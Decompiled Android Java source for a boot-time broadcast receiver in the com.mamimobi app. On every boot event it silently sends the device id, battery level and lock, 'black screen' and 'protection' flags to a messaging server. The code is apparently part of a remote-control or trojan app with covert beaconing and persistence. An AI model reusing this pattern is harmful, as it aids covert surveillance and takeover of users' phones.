package com.mamimobi.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import com.mamimobi.AccessService;
import defpackage.j31;
import defpackage.lm0;
import defpackage.o71;
import defpackage.t40;
import io.nats.client.support.ApiConstants;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public class BTReceiver extends BroadcastReceiver {
    public static float a(Context context) {
        Intent intentRegisterReceiver = context.registerReceiver(null, new IntentFilter("android.intent.action.BATTERY_CHANGED"));
        if (intentRegisterReceiver == null) {
            return 50.0f;
        }
        int intExtra = intentRegisterReceiver.getIntExtra(ApiConstants.LEVEL, -1);
        int intExtra2 = intentRegisterReceiver.getIntExtra("scale", -1);
        if (intExtra == -1 || intExtra2 == -1) {
            return 50.0f;
        }
        return (intExtra / intExtra2) * 100.0f;
    }

    @Override // android.content.BroadcastReceiver
    public final void onReceive(Context context, Intent intent) {
        try {
            AccessService.s();
            o71 o71VarF = o71.f(context);
            lm0 lm0Var = o71VarF.e;
            String strV = t40.V(context);
            if ("android.intent.action.BOOT_COMPLETED".equals(intent.getAction())) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(ApiConstants.ID, strV);
                jSONObject.put(ApiConstants.ACTION, "boot_completed");
                jSONObject.put("locked", AccessService.F0.get());
                jSONObject.put("isBlackScreen", AccessService.J0.get());
                jSONObject.put("isProtected", AccessService.M0.get());
                jSONObject.put("batteryLevel", a(context));
                if (o71VarF.e() != null) {
                    jSONObject.put("clientid", o71VarF.e());
                }
                lm0Var.c(jSONObject.toString().getBytes());
            } else if ("android.intent.action.QUICKBOOT_POWERON".equals(intent.getAction())) {
                JSONObject jSONObject2 = new JSONObject();
                jSONObject2.put(ApiConstants.ID, strV);
                jSONObject2.put(ApiConstants.ACTION, "quickboot_poweron");
                jSONObject2.put("locked", AccessService.F0.get());
                jSONObject2.put("isBlackScreen", AccessService.J0.get());
                jSONObject2.put("isProtected", AccessService.M0.get());
                jSONObject2.put("batteryLevel", a(context));
                if (o71VarF.e() != null) {
                    jSONObject2.put("clientid", o71VarF.e());
                }
                lm0Var.c(jSONObject2.toString().getBytes());
            } else if ("android.intent.action.LOCKED_BOOT_COMPLETED".equals(intent.getAction())) {
                JSONObject jSONObject3 = new JSONObject();
                jSONObject3.put(ApiConstants.ID, strV);
                jSONObject3.put(ApiConstants.ACTION, "locked_boot_completed");
                jSONObject3.put("locked", AccessService.F0.get());
                jSONObject3.put("isBlackScreen", AccessService.J0.get());
                jSONObject3.put("isProtected", AccessService.M0.get());
                jSONObject3.put("batteryLevel", a(context));
                if (o71VarF.e() != null) {
                    jSONObject3.put("clientid", o71VarF.e());
                }
                lm0Var.c(jSONObject3.toString().getBytes());
            }
        } catch (Exception unused) {
        }
        j31.g0(context.getApplicationContext());
    }
}
